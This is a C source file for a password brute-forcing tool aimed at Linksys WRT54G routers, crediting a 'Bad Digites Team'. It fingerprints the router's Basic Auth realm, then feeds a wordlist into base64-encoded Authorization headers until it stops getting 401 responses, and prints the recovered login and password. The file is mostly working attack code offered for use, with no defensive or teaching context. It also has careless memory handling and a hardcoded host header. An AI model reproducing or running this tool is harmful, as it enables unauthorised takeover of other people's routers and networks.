#include "brutuslinksys.h"



int main(int argc, char *argv[])
{

	welcome();

	if ( argc != 4 ) {
		fprintf(stderr, "!! arguments errors\n!! read README.txt for more information\n");
		return -1;
	}

	char ip[17];
	char login[50];
	char name_file[50];

	strcpy(ip, argv[1]);
	strcpy(login, argv[2]);
	strcpy(name_file, argv[3]);

	if ( router(ip, login, name_file) == -1 )
		return -1;

	return 0;
}



int
router(const char *ip, const char *login, const char *name_file)
{

	if ( type_router_check(ip) == -1 ) {
		fprintf(stderr, "!! Router linksys not detected\n");
		return -1;
	}


	if ( brutus(login, name_file, ip) == -1 ) {
		fprintf(stderr, "password not found\n");
		return -1;
	}

	return 0;
}



int
brutus(const char *login, const char *name_file, const char *ip)
{

	FILE* file = NULL;
	char *passwd = malloc(50 * sizeof(char));
	char *search = NULL;
	char buff[50];


	file = fopen(name_file, "r");

	if ( file == NULL ) {
		fprintf(stderr, "open file <%s> failed\n", name_file);
		free(passwd);
		return -1;
	}

	printf("** open file successfull\n");
	printf("** strat scan .. CTRL+C for stop\n\n");


	while ( fgets(buff, 50, file) ) {

		search = strtok(buff, "\n");
		
		sprintf(passwd, "%s:%s", login, search);

		if ( encode_base64(&passwd) == -1 ) {
			free(passwd);
			return -1;
		}


		printf("** passwd encoded : %s\n",passwd);


		if ( test_passwd(passwd, ip) == 0 ) {
			printf("**Passwd find\n");
			printf("\tlogin : %s\n\tpasswd : %s\n\n", login , search);
			free(passwd);
			return 0;
		}


		memset(buff, 0, sizeof(buff));
		memset(passwd, 0, strlen(passwd));

	}

	free(passwd);
	return -1;
}



int
test_passwd(char *base64_txt, const char *ip)
{
	char *header = NULL;
	header = malloc( 2000 * sizeof(char));


	if ( header == NULL ) {
		fprintf(stderr, "malloc header failed\n");
		return -1;
	}


	if ( send_and_recv_header(ip, 1, &header, base64_txt) == -1 ) {
		free(header);
		return -1;
	}


	if ( strstr(header, "<TITLE>401 Unauthorized</TITLE>") != NULL )
		return -1;


	printf("\n** connect router <192.168.1.1> successfull\n");


	free(header);
	return 0;
}


int
type_router_check(const char *ip)
{
	char *header = malloc( 2000 * sizeof(char));

	if ( header == NULL ) {
		fprintf(stderr, "malloc header failed\n");
		return -1;
	}

	
	if ( send_and_recv_header(ip, 0, &header, "None") == -1 ) {
		free(header);
		return -1;
	}
	
	if ( strstr(header, "realm=\"WRT54G\"") == NULL ) {
		printf("header value error ...\n");
		free(header);
		return -1;
	}

	printf("\n** router linksys WRT54G detected\n");

	free(header);
	return 0;
}



int
send_and_recv_header(const char *ip, mode_t mode, char **header, char *txt)
{
	char *hdr = malloc(2000 * sizeof(char));

	if ( hdr == NULL ) {
		return -1;
	}

	socket_client_t *client = malloc(sizeof(socket_client_t));


	if ( client == NULL ) {
		fprintf(stderr, "malloc failed\n");
		free(hdr);
		return -1;
	}


	if ( socket_client_new(client, ip) == -1 ) {
		free(hdr);
		socket_client_free(client);
		return -1;
	}


	if ( socket_client_connect(client) == -1 ) {
		free(hdr);
		socket_client_free(client);
		return -1;
	}


	if ( mode )
		hdr = build_header(mode, txt);
	else
		hdr = build_header(mode, "None");


	if ( socket_client_send(client->socket_cli, hdr) == -1 ) {
		free(hdr);
		socket_client_free(client);
		return -1;
	}


	if ( socket_client_recv(client->socket_cli, &hdr) == -1 ) {
		free(hdr);
		socket_client_free(client);
		return -1;
	}


	*header = strdup(hdr);


	socket_client_free(client);
	free(hdr);
	return 0;
}


char*
build_header(mode_t mode, const char *base64_txt)
{
	
	char *header = malloc(2000 * sizeof(char));

	memset(header, 0, strlen(header));

	strcat(header, HEADER_G);
	strcat(header, "Host : 192.168.1.1\r\n");
	strcat(header, HEADER_K);
	strcat(header, HEADER_C);

	if ( mode ) {
		strcat(header, "Authorization: Basic ");
		strcat(header, base64_txt);
		strcat(header, "\r\n\r\n");
	}

	else
		strcat(header, "\r\n");

	return header;
}


void
welcome(void)
{
	fprintf(stdout, "\n\t\tBrutus force for Linksys ( WRT54G )\n");
	fprintf(stdout, "\t\tCoded by Simpp\n");
	fprintf(stdout, "\t\tFor : # Bad Digites Team #\n\n");
}
